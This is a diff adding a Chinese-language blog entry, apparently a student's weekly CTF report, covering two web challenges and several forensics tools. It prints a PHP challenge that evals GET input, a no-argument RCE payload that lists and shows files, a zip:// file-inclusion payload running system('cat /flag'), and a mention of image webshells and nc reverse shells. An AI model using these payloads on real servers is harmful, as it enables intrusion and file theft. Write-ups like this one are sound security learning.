@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>WEEK 4 周报</title>
+      <link href="/2023/11/27/WEEK4/"/>
+      <url>/2023/11/27/WEEK4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="WEEK-4-周报"><a href="#WEEK-4-周报" class="headerlink" title="WEEK 4 周报"></a><em>WEEK 4</em> 周报</h1><blockquote><p>GEEK昨天结算了，总榜3%，还可以，写几道有点印象的题目吧，完整的wp有空再说</p></blockquote><h3 id="张灏-2023-11-27"><a href="#张灏-2023-11-27" class="headerlink" title="张灏 2023&#x2F;11&#x2F;27"></a>张灏 2023&#x2F;11&#x2F;27</h3><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-无参数RCE：Pupyy-rce（又名op舔狗日记）（成功）"><a href="#1-无参数RCE：Pupyy-rce（又名op舔狗日记）（成功）" class="headerlink" title="1.无参数RCE：Pupyy_rce（又名op舔狗日记）（成功）"></a>1.无参数RCE：Pupyy_rce（又名op舔狗日记）（成功）</h3><p><strong>参考文献</strong></p><blockquote><p><a href="https://blog.csdn.net/weixin_53146913/article/details/124133822">无参数函数RCE_无参数rce脚本-CSDN博客</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a><br><a href="https://blog.csdn.net/uuzeray/article/details/134338909">【Web】无字母&#x2F;数字&#x2F;参RCE相关例题wp-CSDN博客</a><br>[使用无参数函数进行命令执行_if (‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;<a href="https://blog.csdn.net/kali_Ma/article/details/122544274">^\w]+((?r)?)&#x2F;‘, ‘’, -CSDN博客</a></p></blockquote><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&#39;Content-Type: text/html; charset=utf-8&#39;);error_reporting(0);include(flag.php);//当前目录下有好康的😋if (isset($_GET[&#39;var&#39;]) &amp;&amp; $_GET[&#39;var&#39;]) &#123;  $var = $_GET[&#39;var&#39;];  if (!preg_match(&quot;/env|var|session|header/i&quot;, $var,$match)) &#123;    if (&#39;;&#39; === preg_replace(&#39;/[^\s\(\)]+?\((?R)?\)/&#39;, &#39;&#39;, $var))&#123;    eval($_GET[&#39;var&#39;]);    &#125;    else die(&quot;WAF!!&quot;);  &#125; else&#123;    die(&quot;PLZ DONT HCAK ME😅&quot;);  &#125;&#125;</code></pre><p>查阅资料了解，长成</p><pre><code class="php">if (&#39;;&#39; === preg_replace(&#39;/[^\s\(\)]+?\((?R)?\)/&#39;, &#39;&#39;, $var))&#123;</code></pre><p>这个形状的东西叫做<strong>无参数RCE</strong><br></p><p><strong>参考文章</strong>里有很多使用<strong>无参数函数</strong>进行<strong>命令执行</strong>的<strong>操作</strong>，就不加赘述了。</p><p><strong>参考文章</strong>里用的是</p><pre><code class="php">payload:?exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));</code></pre><p>来打<br></p><p>观察这道题的代码，把<strong>exp</strong>改成<strong>var</strong>即可得到相同的效果，<br>但由于是<strong>随机返回目录下文件</strong>，所以在欣赏了出题人的<strong>长篇原神玩后感</strong>和<strong>多篇舔狗日记</strong>后，我获得了<strong>flag</strong>。</p><h3 id="2-文件上传-一句话图片木马：famale-imp-l0ve-雌小鬼（失败）"><a href="#2-文件上传-一句话图片木马：famale-imp-l0ve-雌小鬼（失败）" class="headerlink" title="2.文件上传&amp;一句话图片木马：famale_imp_l0ve&#x2F;雌小鬼（失败）"></a>2.文件上传&amp;一句话图片木马：famale_imp_l0ve&#x2F;雌小鬼（失败）</h3><p><strong>题目描述太牛魔抽象了：</strong></p><blockquote><p><em>雌小鬼看了下o2takuXX师傅的马子说:”呐<del>就..就怎么长吗，真是杂鱼呢</del>❤”,你能来帮帮他吗？</em></p></blockquote><p>经过一番探索发现只能上传zip文件还不会解压<br>描后发现了一些可疑的路由，访问&#x2F;include.php</p><pre><code class="php">&lt;?php//o2takuXX师傅说有问题，忘看了。header(&#39;Content-Type: text/html; charset=utf-8&#39;);highlight_file(__FILE__);$file = $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;)&#123;  include($file);&#125;?&gt;</code></pre><p>尝试上传了一下，然后尝试用phar伪协议<br>得到<strong>payload:?file&#x3D;zip:&#x2F;&#x2F;upload&#x2F;1.zip%231.jpg&amp;cmd&#x3D;system(‘cat &#x2F;flag’);</strong><br>然后就没有然后嘞</p><h4 id="图片木马"><a href="#图片木马" class="headerlink" title="图片木马"></a>图片木马</h4><p>后来才知道还有图片木马这种东西<br>大概是上传<strong>一句话木马</strong>写在<strong>txt文件</strong>里，改后缀<strong>jpg</strong>，然后压缩成<strong>zip</strong>文件<br></p><h2 id="新工具"><a href="#新工具" class="headerlink" title="新工具"></a>新工具</h2><h3 id="1-nc监听反弹shell"><a href="#1-nc监听反弹shell" class="headerlink" title="1.nc监听反弹shell"></a>1.nc监听反弹shell</h3><p>算是新功能解锁吧,虽然也没整出东西</p><h3 id="2-MP3stego"><a href="#2-MP3stego" class="headerlink" title="2.MP3stego"></a>2.MP3stego</h3><p>音频隐写神器MP3stego，<strong>知道密码的情况下</strong>可以提取出<strong>MP3</strong>中隐写的信息，好用滴很呐</p><p>虽然没做出题目，可能是解密时用到的密码错了</p><ul><li><em>1920秒和10:52这两个信息到底能推出什么密码啊</em></li></ul><pre><code>[Frame 8697]Frame cannot be locatedInput stream may be emptyAvg slots/frame = 1044.903; b/smp = 7.26; br = 320.002 kbps[ERROR]Encrypt: unexpected end of cipher message.</code></pre><h3 id="3-自动拼图"><a href="#3-自动拼图" class="headerlink" title="3.自动拼图"></a>3.自动拼图</h3><p><a href="https://github.com/JamesHoi/PuzzleSolver">https://github.com/JamesHoi/PuzzleSolver</a><br>脚本将多张碎片拼接成一张，然后新建进行拼接</p><h3 id="4-WEBP转格式"><a href="#4-WEBP转格式" class="headerlink" title="4.WEBP转格式"></a>4.WEBP转格式</h3><p>.webp打开来是动图，把它转换成gif图片然后提取每帧进行拼接<br>在线网站<a href="https://www.aconvert.com/cn/image/webp-to-gif/">WEBP转GIF - 在线转换图像文件 (aconvert.com)</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> WEEK </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WEEK 3 周报</title>
       <link href="/2023/11/20/WEEK3/"/>
       <url>/2023/11/20/WEEK3/</url>
